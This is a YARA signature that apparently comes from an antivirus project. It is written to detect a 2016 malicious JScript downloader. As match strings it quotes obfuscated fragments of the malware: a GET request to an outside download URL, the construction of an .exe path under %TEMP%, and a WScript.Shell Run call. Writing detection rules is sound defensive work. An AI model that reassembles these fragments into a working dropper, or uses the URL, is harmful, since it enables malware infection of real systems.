rule sig_20160330_5f3d694d8519dd2677c48ad635935281 {
  meta:
    description = "datamaliciousorder - file 20160330_5f3d694d8519dd2677c48ad635935281.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "420d91274f0e6991fae2268e3bb5535cded4562766224a488ddc3a8ce90ca779"

  strings:
    $s1  = "_QU0[_B](\"GET\", \"http://zakazdetali.kz/v7bsad\", false);" fullword ascii
    $s2  = "function _X(_J, _QP){_W = _W * 1; return _J - _QP;};" fullword ascii
    $s3  = "var _TR = function _IW() {return WScript[_F0](\"WScript\"+\".Shell\");}(), _WB = 11;" fullword ascii
    $s4  = "if (_QU0[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _F() {return _TR[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"KTioIti6eyHT3.ex\" + \"e\";};" fullword ascii
    $s6  = "function _OS(){return _II + \"\";};" fullword ascii
    $s7  = "function _TT() {return ((_MD == true) && (_MD == _RB)) ? 1 : _W;};" fullword ascii
    $s8  = "function _NT(_O){_TR[\"Run\"](_O, _W, _W);};" fullword ascii
    $s9  = " while (_OE){" fullword ascii
    $s10 = "var _XQ = new this[\"Date\"]();" fullword ascii
    $s11 = "function _K(_E) {var _V = (1, 2, 3, 4, 5, _E); return _V;};" fullword ascii
    $s12 = "function _L()" fullword ascii
    $s13 = "function _WL(){return 22;};" fullword ascii
    $s14 = "function _RH(){return _F0;};" fullword ascii
    $s15 = "return _X(_YF, _GS);" fullword ascii
    $s16 = "var _B0 = false;" fullword ascii
    $s17 = "var _MD = false;" fullword ascii
    $s18 = "var _RB = false;" fullword ascii
    $s19 = "_MD = true; " fullword ascii
    $s20 = "_RB = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}